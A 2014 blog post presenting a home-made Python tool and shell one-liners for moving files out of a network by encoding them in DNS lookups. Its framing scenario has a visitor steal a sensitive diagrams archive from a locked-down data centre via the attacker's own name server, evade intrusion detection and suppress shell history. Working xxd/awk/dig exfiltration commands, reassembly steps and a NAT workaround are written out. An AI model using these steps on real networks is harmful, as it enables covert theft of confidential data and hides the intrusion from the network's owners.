---
categories:
- tools
- dns
- file transfer
comments: true
date: 2014-03-11T00:00:00Z
published: true
title: dnsfilexfer - yet another take on file transfer via DNS
---

This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.

### this article is not...
... about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.

<!--more-->

## the idea
At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged & formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.

Consider the following scenario.

You have access to a very *secure* network. *Secure* in the sense that the firewalls are configured to allow **NO** outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this *secure* network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.

You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, `z300_technical_diagrams.zip`. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.

Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi 'non-suspect' DNS lookup requests.

## the setup
So, to get the file `z300_technical_diagrams.zip` out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)

```
% dig A 123456.fake.com @127.0.0.1

; <<>> DiG 9.8.3-P1 <<>> 123456.fake.com @127.0.0.1
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24059
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;123456.fake.com.    IN A

;; ANSWER SECTION:
123456.fake.com.  60 IN A  127.0.0.1

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Mar 11 07:55:31 2014
;; MSG SIZE  rcvd: 49
```

Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.

## preparing the file
With comms working to our name server, we can get some information about the file and test if a hex dump tool like `xxd` is available. This will enable us to break the file up in to little parts that can be used as DNS questions.

```
% ls -lah z300_technical_diagrams.zip
-rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
% xxd -p z300_technical_diagrams.zip
504b03040a000000000042a9384400000000000000000000000017001c00
7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
e3523947e35275780b000104f50100000414000000504b03040a00000000
0049a938440000000000000000000000001b001c007068616e746f6d6a73
[snip]
```

Great. It looks like we have everything we need to make this work. :)

## 'transferring' the file
Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:

```
% xxd -p z300_technical_diagrams.zip | awk '{ print "dig " $1 ".fake.io @127.0.0.1 +short" }'
dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
[snip]
```

As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with `| sh` at the end, performing the actual lookups.
On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.

## back home
We close our bash session with `kill -9 $$` to prevent any history from writing and relogin, completing the original work we came for.

Back home, it was time to stop the `tcpdump` that was running, and attempt to reassemble that file. The domain we used for the lookups was `fake.io`, so we just grep the output for that to ensure that we got the relevant parts (real ip's masked to 127.0.0.1):

```
% tcpdump -r raw -n | grep fake.io
reading from file raw, link-type NULL (BSD loopback)
19:31:32.919144 IP 127.0.0.1.49331 > 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
19:31:32.925135 IP 127.0.0.1.51116 > 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
[snip]
```

Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.

```
% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1
reading from file raw, link-type NULL (BSD loopback)
504b03040a000000000042a9384400000000000000000000000017001c00
7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
[snip]
```

Lastly, we can pipe all of this through `xxd -r` and redirect the output to a new file. If all went well, this file *should* be `z300_technical_diagrams.zip`

```
% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r > z300_technical_diagrams.zip

% file z300_technical_diagrams.zip
z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract
```

## python all the things
Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the `dig` command to timeout, and it would retry like 3 times which would mean you would need to `uniq` your results before you `xxd -r` them.

So, in order for me to *learn something new*, I figured I'd write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o

The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.

# dnsfilexfer
So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; `dns_send.py` & `dns_recv.py`, one is able to 'send files' using DNS lookups and store them on the remote end. You also have the option of only using the send part with the `-X` flag, and have the output ready to use with `xxd -r` later on your server.

The code can be [found here](https://github.com/leonjza/dnsfilexfer)

## sample usage
Below a full example of the usage, both on the client & server:

We start the 'server' component along with a secret that will be used to decrypt received messages. For now, we have omitted `-F` as we are not going to write the message to a file, yet.
```
% sudo python dns_recv.py --listen 0.0.0.0 --secret
What is the secret?
[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
%
```

With our 'server' started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:

```
% echo "This is a test message that will be sent over DNS\n Cool eh?" > /tmp/message
% cat /tmp/message
This is a test message that will be sent over DNS
Cool eh?

% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
What is the secret?
[INFO] Message is encypted with the secret
---START OF MESSAGE---
/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
---END OF MESSAGE---
[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
[INFO] Sending lookup for : 000638773d3d.fake.io
[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
[INFO] Message sent in 8 requests
```

We can see that the message was 'sent' using 8 requests and the `--START OF MESSAGE--` preview contains the encrypted version of our message.
Looking at the server, we see that the message is received:

```
% sudo python dns_recv.py --listen 0.0.0.0 --secret
Password:
What is the secret?
[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
[INFO] Full resource record query was for: 000638773d3d.fake.io.
[INFO] Processing frame 000638773d3d
[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
[OK] Message was received in 8 requests
[INFO] Message has been decrypted with the configured secret
Message identifier: dns_message_test

---START OF MESSAGE---
This is a test message that will be sent over DNS
Cool eh?

---END OF MESSAGE---
```

The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats *should* work just fine. **HOWEVER** Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.

Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.

## Some afterthoughts
So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with `--domain` on the sending script, and have something like `fake.<your valid zone>.com`, which will result in you still being able to grep for `fake` in the tcpdump replay.

### further reading
https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306
http://www.aldeid.com/wiki/File-transfer-via-DNS
